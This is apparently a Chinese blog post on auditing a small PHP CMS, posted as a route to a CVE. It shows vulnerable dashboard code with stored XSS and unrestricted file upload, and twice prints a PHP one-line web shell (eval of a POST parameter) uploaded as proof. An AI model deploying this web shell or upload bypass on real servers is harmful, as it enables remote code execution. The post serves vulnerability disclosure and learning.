{"title":"从零到入门水CVE","uid":"c41197658be58622f172adba6499db6f","slug":"从零到入门水CVE","date":"2022-08-09T11:28:30.000Z","updated":"2023-03-14T07:10:48.000Z","comments":true,"path":"api/articles/从零到入门水CVE.json","keywords":null,"cover":"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141510107.jpeg","content":"<h1 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h1><p>认识的师傅说有的CMS是相对较简单的，拿到源码后就可以简单的进行一下代码审计，审出漏洞的话就可以尝试提交。本次审计过程记录如下</p>\n<h1 id=\"审计过程\"><a href=\"#审计过程\" class=\"headerlink\" title=\"审计过程\"></a>审计过程</h1><p>找到简单的CMS后，进行本地环境搭建，然后用Seay审计系统进行扫描<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130150128.png\" alt=\"在这里插入图片描述\"><br>发现漏洞分为三种，SQL注入，文件上传，XSS，接下来进行</p>\n<h2 id=\"dashboard-add-blog-php\"><a href=\"#dashboard-add-blog-php\" class=\"headerlink\" title=\"/dashboard/add-blog.php\"></a>/dashboard/add-blog.php</h2><h3 id=\"SQL注入-失败\"><a href=\"#SQL注入-失败\" class=\"headerlink\" title=\"SQL注入(失败)\"></a>SQL注入(失败)</h3><p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130150118.png\" alt=\"在这里插入图片描述\"><br>查看这个<code>INSERT</code>语句，发现变量被单引号包裹，观察变量的传值方式，发现被<code>mysqli_real_escape_string</code>函数包裹，这个函数会转义特殊字符，对单引号这些进行了转义，此时的话这里暂时看是无法实现SQL注入的，看下一个漏洞点。</p>\n<h3 id=\"XSS\"><a href=\"#XSS\" class=\"headerlink\" title=\"XSS\"></a>XSS</h3><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">           <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">ISSET</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'save'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n<span class=\"token variable\">$blog_title</span> <span class=\"token operator\">=</span> <span class=\"token function\">mysqli_real_escape_string</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$con</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'blog_title'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$blog_desc</span> <span class=\"token operator\">=</span> <span class=\"token function\">mysqli_real_escape_string</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$con</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'blog_desc'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$blog_detail</span> <span class=\"token operator\">=</span> <span class=\"token function\">mysqli_real_escape_string</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$con</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'blog_detail'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> <span class=\"token function\">strlen</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$blog_title</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&lt;</span> <span class=\"token number\">5</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n<span class=\"token variable\">$msg</span><span class=\"token operator\">=</span><span class=\"token variable\">$msg</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"Blog Title Must Be More Than 5 Char Length.&lt;BR>\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$status</span><span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"NOTOK\"</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">&#125;</span>\n <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> <span class=\"token function\">strlen</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$blog_desc</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">></span> <span class=\"token number\">150</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n<span class=\"token variable\">$msg</span><span class=\"token operator\">=</span><span class=\"token variable\">$msg</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"Short description Must Be Less Than 150 Char Length.&lt;BR>\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$status</span><span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"NOTOK\"</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> <span class=\"token function\">strlen</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$blog_detail</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&lt;</span> <span class=\"token number\">15</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n  <span class=\"token variable\">$msg</span><span class=\"token operator\">=</span><span class=\"token variable\">$msg</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"Blog Detail Must Be More Than 15 Char Length.&lt;BR>\"</span><span class=\"token punctuation\">;</span>\n  <span class=\"token variable\">$status</span><span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"NOTOK\"</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>对于上传的变量只是限制了长度，没有防护XSS的，导致了XSS的出现<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130150107.png\" alt=\"在这里插入图片描述\"><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130150112.png\" alt=\"在这里插入图片描述\"><br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130150121.png\" alt=\"在这里插入图片描述\"></p>\n<h3 id=\"文件上传\"><a href=\"#文件上传\" class=\"headerlink\" title=\"文件上传\"></a>文件上传</h3><pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\">$uploads_dir <span class=\"token operator\">=</span> <span class=\"token string\">'uploads/blog'</span><span class=\"token punctuation\">;</span>\n\n        $tmp_name <span class=\"token operator\">=</span> $_FILES<span class=\"token punctuation\">[</span><span class=\"token string\">\"ufile\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string\">\"tmp_name\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n        <span class=\"token operator\">//</span> basename<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> may prevent filesystem traversal attacks<span class=\"token punctuation\">;</span>\n        <span class=\"token operator\">//</span> further validation<span class=\"token operator\">/</span>sanitation of the filename may be appropriate\n        $name <span class=\"token operator\">=</span> basename<span class=\"token punctuation\">(</span>$_FILES<span class=\"token punctuation\">[</span><span class=\"token string\">\"ufile\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string\">\"name\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        $random_digit<span class=\"token operator\">=</span>rand<span class=\"token punctuation\">(</span><span class=\"token number\">0000</span><span class=\"token punctuation\">,</span><span class=\"token number\">9999</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        $new_file_name<span class=\"token operator\">=</span>$random_digit<span class=\"token punctuation\">.</span>$name<span class=\"token punctuation\">;</span>\n\n        move_uploaded_file<span class=\"token punctuation\">(</span>$tmp_name<span class=\"token punctuation\">,</span> <span class=\"token string\">\"$uploads_dir/$new_file_name\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>上传文件时未检验文件格式，导致木马文件可以正常上传<br>上传文件内容</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token operator\">&lt;</span>?php\nphpinfo<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token decorator annotation punctuation\">@eval</span><span class=\"token punctuation\">(</span>$_POST<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n?<span class=\"token operator\">></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130150102.png\" alt=\"在这里插入图片描述\"><br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130150496.png\" alt=\"在这里插入图片描述\"><br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130150545.png\" alt=\"在这里插入图片描述\"><br>提交后</p>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130150738.png\" alt=\"在这里插入图片描述\"><br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130150626.png\" alt=\"在这里插入图片描述\"></p>\n<h2 id=\"dashboard-add-social-php\"><a href=\"#dashboard-add-social-php\" class=\"headerlink\" title=\"/dashboard/add-social.php\"></a>/dashboard/add-social.php</h2><h3 id=\"SQL注入（失败）\"><a href=\"#SQL注入（失败）\" class=\"headerlink\" title=\"SQL注入（失败）\"></a>SQL注入（失败）</h3><p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130150613.png\" alt=\"在这里插入图片描述\"></p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">           <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">ISSET</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'save'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n<span class=\"token variable\">$name</span> <span class=\"token operator\">=</span> <span class=\"token function\">mysqli_real_escape_string</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$con</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'name'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$fa</span> <span class=\"token operator\">=</span> <span class=\"token function\">mysqli_real_escape_string</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$con</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'fa'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$social_link</span> <span class=\"token operator\">=</span> <span class=\"token function\">mysqli_real_escape_string</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$con</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'social_link'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> <span class=\"token function\">strlen</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$name</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&lt;</span> <span class=\"token number\">2</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n<span class=\"token variable\">$msg</span><span class=\"token operator\">=</span><span class=\"token variable\">$msg</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"Social Network Name Must Contain A Char.&lt;BR>\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$status</span><span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"NOTOK\"</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">&#125;</span>\n <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> <span class=\"token function\">strlen</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$fa</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&lt;</span> <span class=\"token number\">1</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n<span class=\"token variable\">$msg</span><span class=\"token operator\">=</span><span class=\"token variable\">$msg</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"Fontawesome Must Be At Least 2 Char Long.&lt;BR>\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$status</span><span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"NOTOK\"</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> <span class=\"token function\">strlen</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$social_link</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&lt;</span> <span class=\"token number\">5</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n  <span class=\"token variable\">$msg</span><span class=\"token operator\">=</span><span class=\"token variable\">$msg</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"Social Link Must Be More Than 6 Char Length.&lt;BR>\"</span><span class=\"token punctuation\">;</span>\n  <span class=\"token variable\">$status</span><span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"NOTOK\"</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">&#125;</span>\n\n\n\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$status</span><span class=\"token operator\">==</span><span class=\"token string double-quoted-string\">\"OK\"</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">&#123;</span>\n<span class=\"token variable\">$qb</span><span class=\"token operator\">=</span><span class=\"token function\">mysqli_query</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$con</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"INSERT INTO social (name, fa, social_link) VALUES ('<span class=\"token interpolation\"><span class=\"token variable\">$name</span></span>', '<span class=\"token interpolation\"><span class=\"token variable\">$fa</span></span>', '<span class=\"token interpolation\"><span class=\"token variable\">$social_link</span></span>')\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>这里的话不难看出同之前一致，SQL注入存在防护，因此不存在SQL注入，这里属于误报，下一处。</p>\n<h3 id=\"XSS-1\"><a href=\"#XSS-1\" class=\"headerlink\" title=\"XSS\"></a>XSS</h3><pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\">           <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>ISSET<span class=\"token punctuation\">(</span>$_POST<span class=\"token punctuation\">[</span><span class=\"token string\">'save'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n$name <span class=\"token operator\">=</span> mysqli_real_escape_string<span class=\"token punctuation\">(</span>$con<span class=\"token punctuation\">,</span>$_POST<span class=\"token punctuation\">[</span><span class=\"token string\">'name'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n$fa <span class=\"token operator\">=</span> mysqli_real_escape_string<span class=\"token punctuation\">(</span>$con<span class=\"token punctuation\">,</span>$_POST<span class=\"token punctuation\">[</span><span class=\"token string\">'fa'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n$social_link <span class=\"token operator\">=</span> mysqli_real_escape_string<span class=\"token punctuation\">(</span>$con<span class=\"token punctuation\">,</span>$_POST<span class=\"token punctuation\">[</span><span class=\"token string\">'social_link'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> strlen<span class=\"token punctuation\">(</span>$name<span class=\"token punctuation\">)</span> <span class=\"token operator\">&lt;</span> <span class=\"token number\">2</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n$msg<span class=\"token operator\">=</span>$msg<span class=\"token punctuation\">.</span><span class=\"token string\">\"Social Network Name Must Contain A Char.&lt;BR>\"</span><span class=\"token punctuation\">;</span>\n$status<span class=\"token operator\">=</span> <span class=\"token string\">\"NOTOK\"</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">&#125;</span>\n <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> strlen<span class=\"token punctuation\">(</span>$fa<span class=\"token punctuation\">)</span> <span class=\"token operator\">&lt;</span> <span class=\"token number\">1</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n$msg<span class=\"token operator\">=</span>$msg<span class=\"token punctuation\">.</span><span class=\"token string\">\"Fontawesome Must Be At Least 2 Char Long.&lt;BR>\"</span><span class=\"token punctuation\">;</span>\n$status<span class=\"token operator\">=</span> <span class=\"token string\">\"NOTOK\"</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> strlen<span class=\"token punctuation\">(</span>$social_link<span class=\"token punctuation\">)</span> <span class=\"token operator\">&lt;</span> <span class=\"token number\">5</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n  $msg<span class=\"token operator\">=</span>$msg<span class=\"token punctuation\">.</span><span class=\"token string\">\"Social Link Must Be More Than 6 Char Length.&lt;BR>\"</span><span class=\"token punctuation\">;</span>\n  $status<span class=\"token operator\">=</span> <span class=\"token string\">\"NOTOK\"</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>未对内容进行防护，只限制了长度，导致了XSS的出现<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130150642.png\" alt=\"在这里插入图片描述\"><br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130150873.png\" alt=\"在这里插入图片描述\"></p>\n<h2 id=\"dashboard-add-service-php\"><a href=\"#dashboard-add-service-php\" class=\"headerlink\" title=\"/dashboard/add-service.php\"></a>/dashboard/add-service.php</h2><h3 id=\"XSS-2\"><a href=\"#XSS-2\" class=\"headerlink\" title=\"XSS\"></a>XSS</h3><pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\">$msg<span class=\"token operator\">=</span><span class=\"token string\">\"\"</span><span class=\"token punctuation\">;</span>\n           <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>ISSET<span class=\"token punctuation\">(</span>$_POST<span class=\"token punctuation\">[</span><span class=\"token string\">'save'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n$service_title <span class=\"token operator\">=</span> mysqli_real_escape_string<span class=\"token punctuation\">(</span>$con<span class=\"token punctuation\">,</span>$_POST<span class=\"token punctuation\">[</span><span class=\"token string\">'service_title'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n$service_desc <span class=\"token operator\">=</span> mysqli_real_escape_string<span class=\"token punctuation\">(</span>$con<span class=\"token punctuation\">,</span>$_POST<span class=\"token punctuation\">[</span><span class=\"token string\">'service_desc'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n$service_detail <span class=\"token operator\">=</span> mysqli_real_escape_string<span class=\"token punctuation\">(</span>$con<span class=\"token punctuation\">,</span>$_POST<span class=\"token punctuation\">[</span><span class=\"token string\">'service_detail'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> strlen<span class=\"token punctuation\">(</span>$service_title<span class=\"token punctuation\">)</span> <span class=\"token operator\">&lt;</span> <span class=\"token number\">5</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n$msg<span class=\"token operator\">=</span>$msg<span class=\"token punctuation\">.</span><span class=\"token string\">\"Service Title Must Be More Than 5 Char Length.&lt;BR>\"</span><span class=\"token punctuation\">;</span>\n$status<span class=\"token operator\">=</span> <span class=\"token string\">\"NOTOK\"</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">&#125;</span>\n <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> strlen<span class=\"token punctuation\">(</span>$service_desc<span class=\"token punctuation\">)</span> <span class=\"token operator\">></span> <span class=\"token number\">150</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n$msg<span class=\"token operator\">=</span>$msg<span class=\"token punctuation\">.</span><span class=\"token string\">\"Short description Must Be Less Than 150 Char Length.&lt;BR>\"</span><span class=\"token punctuation\">;</span>\n$status<span class=\"token operator\">=</span> <span class=\"token string\">\"NOTOK\"</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> strlen<span class=\"token punctuation\">(</span>$service_detail<span class=\"token punctuation\">)</span> <span class=\"token operator\">&lt;</span> <span class=\"token number\">15</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n  $msg<span class=\"token operator\">=</span>$msg<span class=\"token punctuation\">.</span><span class=\"token string\">\"Service Detail Must Be More Than 15 Char Length.&lt;BR>\"</span><span class=\"token punctuation\">;</span>\n  $status<span class=\"token operator\">=</span> <span class=\"token string\">\"NOTOK\"</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">&#125;</span>\n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>只检验了长度，未对XSS语句进行防护，导致XSS漏洞<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130150001.png\" alt=\"在这里插入图片描述\"><br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130150017.png\" alt=\"在这里插入图片描述\"></p>\n<h3 id=\"文件上传-1\"><a href=\"#文件上传-1\" class=\"headerlink\" title=\"文件上传\"></a>文件上传</h3><pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\">\n$uploads_dir <span class=\"token operator\">=</span> <span class=\"token string\">'uploads/services'</span><span class=\"token punctuation\">;</span>\n\n        $tmp_name <span class=\"token operator\">=</span> $_FILES<span class=\"token punctuation\">[</span><span class=\"token string\">\"ufile\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string\">\"tmp_name\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n        <span class=\"token operator\">//</span> basename<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> may prevent filesystem traversal attacks<span class=\"token punctuation\">;</span>\n        <span class=\"token operator\">//</span> further validation<span class=\"token operator\">/</span>sanitation of the filename may be appropriate\n        $name <span class=\"token operator\">=</span> basename<span class=\"token punctuation\">(</span>$_FILES<span class=\"token punctuation\">[</span><span class=\"token string\">\"ufile\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string\">\"name\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        $random_digit<span class=\"token operator\">=</span>rand<span class=\"token punctuation\">(</span><span class=\"token number\">0000</span><span class=\"token punctuation\">,</span><span class=\"token number\">9999</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        $new_file_name<span class=\"token operator\">=</span>$random_digit<span class=\"token punctuation\">.</span>$name<span class=\"token punctuation\">;</span>\n\n        move_uploaded_file<span class=\"token punctuation\">(</span>$tmp_name<span class=\"token punctuation\">,</span> <span class=\"token string\">\"$uploads_dir/$new_file_name\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>对文件本身未进行检验，格式也没有要求，导致PHP一句话木马可以成功上传<br>上传文件内容</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token operator\">&lt;</span>?php\nphpinfo<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token decorator annotation punctuation\">@eval</span><span class=\"token punctuation\">(</span>$_POST<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n?<span class=\"token operator\">></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130150061.png\" alt=\"在这里插入图片描述\"><br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130150107.png\" alt=\"在这里插入图片描述\"><br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130150236.png\" alt=\"在这里插入图片描述\"><br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130150269.png\" alt=\"在这里插入图片描述\"><br>由于剩下的几个漏洞点均与上方这几个相似，SQL注入存在防护，XSS和文件上传未进行防护，所以这里不再一一演示</p>\n<h1 id=\"提交\"><a href=\"#提交\" class=\"headerlink\" title=\"提交\"></a>提交</h1><p>将过程简单梳理一下，再用英文翻译一次，去<a href=\"https://vuldb.com/?id.add\">https://vuldb.com/</a>提交即可<br>提交几小时后收到了邮件<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130150364.png\" alt=\"在这里插入图片描述\"><br>在网站下查看<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130150395.png\" alt=\"在这里插入图片描述\"><br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130150471.png\" alt=\"在这里插入图片描述\"><br>fw的我成功的水到了一个CVE！！！</p>\n","feature":true,"text":"前言认识的师傅说有的CMS是相对较简单的，拿到源码后就可以简单的进行一下代码审计，审出漏洞的话就可以尝试提交。本次审计过程记录如下 审计过程找到简单的CMS后，进行本地环境搭建，然后用Seay审计系统进行扫描发现漏洞分为三种，SQL注入，文件上传，XSS，接下来进行 /dashb...","link":"","photos":[],"count_time":{"symbolsCount":"4.3k","symbolsTime":"4 mins."},"categories":[{"name":"代码审计","slug":"代码审计","count":7,"path":"api/categories/代码审计.json"}],"tags":[{"name":"CVE","slug":"CVE","count":1,"path":"api/tags/CVE.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E5%89%8D%E8%A8%80\"><span class=\"toc-text\">前言</span></a></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E5%AE%A1%E8%AE%A1%E8%BF%87%E7%A8%8B\"><span class=\"toc-text\">审计过程</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#dashboard-add-blog-php\"><span class=\"toc-text\">&#x2F;dashboard&#x2F;add-blog.php</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#SQL%E6%B3%A8%E5%85%A5-%E5%A4%B1%E8%B4%A5\"><span class=\"toc-text\">SQL注入(失败)</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#XSS\"><span class=\"toc-text\">XSS</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0\"><span class=\"toc-text\">文件上传</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#dashboard-add-social-php\"><span class=\"toc-text\">&#x2F;dashboard&#x2F;add-social.php</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#SQL%E6%B3%A8%E5%85%A5%EF%BC%88%E5%A4%B1%E8%B4%A5%EF%BC%89\"><span class=\"toc-text\">SQL注入（失败）</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#XSS-1\"><span class=\"toc-text\">XSS</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#dashboard-add-service-php\"><span class=\"toc-text\">&#x2F;dashboard&#x2F;add-service.php</span></a><ol 